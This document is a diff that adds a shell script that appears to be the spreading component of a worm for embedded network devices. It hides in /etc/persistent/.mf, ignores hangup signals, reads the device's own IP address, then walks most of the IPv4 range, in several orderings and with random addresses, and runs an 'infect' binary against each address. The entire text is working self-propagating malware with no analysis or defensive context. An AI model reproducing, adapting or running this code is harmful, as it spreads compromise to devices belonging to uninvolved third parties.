@@ -1,0 +1,80 @@
+#!/bin/sh
+trap '' HUP
+chmod +x /etc/persistent/.mf/curl
+cd /etc/persistent/.mf/
+
+ip=$(ifconfig ath0 2>/dev/null | grep 'inet ' | sed "s/.*inet addr:\([^ ]*\).*/\1/g")
+if [ -z "$ip" ] ; then
+ip=$(ifconfig br0 2>/dev/null | grep 'inet ' | sed "s/.*inet addr:\([^ ]*\).*/\1/g")
+fi
+if [ -z "$ip" ] ; then
+ip=$(ifconfig ppp0 2>/dev/null | grep 'inet ' | sed "s/.*inet addr:\([^ ]*\).*/\1/g")
+fi
+p1=$(echo $ip | cut -d "." -f1)
+test ! -z "$p1" || p1=1
+test -z "$1" || p1=$(($p1+$1))
+p2=$(echo $ip | cut -d "." -f2)
+test ! -z "$p2" || p2=0
+test -z "$2" || p2=$(($p2+$2))
+p3=$(echo $ip | cut -d "." -f3)
+test ! -z "$p3" || p3=0
+p3c=0
+p2c=0
+p1c=0
+p4=0
+p5=0
+
+while [ $p1c -lt 224 ]
+do
+while [ $p2c -lt 255 ]
+do
+while [ $p3c -lt 255 ]
+do
+while [ $p4 -lt 255 ]
+do
+while [ $p5 -lt 4 ] 
+do
+if [ $p5 = 0 ] ; then
+ip="$p1.$p2.$p3.$p4"
+fi
+if [ $p5 = 1 ] ; then
+ip="$p3.$p4.$p2.$p1"
+fi
+if [ $p5 = 2 ] ; then
+ip="$p1.$p3.$p2.$p4"
+fi
+if [ $p5 = 3  ] ; then
+ rn="$(dd if=/dev/urandom bs=4 count=1)" 2>/dev/null >/dev/null
+ num=`echo $rn | hexdump -b 2>/dev/null | head -n 1 | cut -f 2-5 -d' ' | tr " " "."`
+ ip=$num
+fi
+
+/etc/persistent/.mf/infect $ip
+
+p5=$((p5+1))
+done
+p5=0
+p4=$((p4+1))
+done
+p4=0
+p3=$((p3+1))
+if [ "$p3" -gt 255 ] ; then p3=0 ; fi
+p3c=$((p3c+1))
+done
+p4=0
+p3c=0
+p3=0
+p2=$((p2+1))
+if [ "$p2" -gt 255 ] ; then p2=0 ; fi
+p2c=$((p2c+1))
+done
+p4=0
+p3=0
+p3c=0
+p2=0
+p2c=0
+p1=$((p1+1))
+if [ "$p1" -gt 223 ] ; then p1=1 ; fi
+p1c=$((p1c+1))
+done
+
